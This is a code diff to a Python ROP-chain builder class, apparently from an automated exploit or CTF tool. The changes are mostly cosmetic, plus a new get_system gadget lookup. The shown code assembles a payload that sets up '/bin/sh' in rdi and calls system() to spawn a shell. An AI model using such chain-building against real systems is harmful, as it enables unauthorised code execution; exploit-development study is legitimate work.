@@ -82,7 +82,7 @@ class ROP:
         elif self.analysis.has_binsh():
             payload += self.fill_reg("rdi", self.analysis.get_binsh())
         payload += self.fill_reg("rsi", 0)
-        payload += p64(self.e.sym["system"])
+        payload += p64(self.e.sym['system'])
 
         return payload
 
@@ -127,7 +127,6 @@ class ROP:
             if i.strip(';') in registers:
                 out.append(i.strip(';'))
         return out.index(reg)
-
     
     def pop_reg(self, reg):
         for i in self.get_pops():
@@ -135,7 +134,6 @@ class ROP:
                 return [i.split(":")[0], 1, self.reg_pos(reg, i)]
             elif "pop " + reg in i:
                 return [i.split(":")[0], self.num_pops(i), self.reg_pos(reg, i)]
-
 
     def fill_reg(self, reg, val):
         if isinstance(val, int):
@@ -150,13 +148,18 @@ class ROP:
                 chain += p64(0)
         return chain
 
-
     def get_syscall(self):
         for i in self.gadgets:
             if "syscall" in i:
                 return int(i.split(":")[0], 16)
         return None
-    
+   
+    def get_system(self):
+        for i in self.gadgets:
+            if "system" in i:
+                return int(i.split(":")[0], 16)
+        return None
+
     def realign(self):
         return p64(self.analysis.get_fini())
 
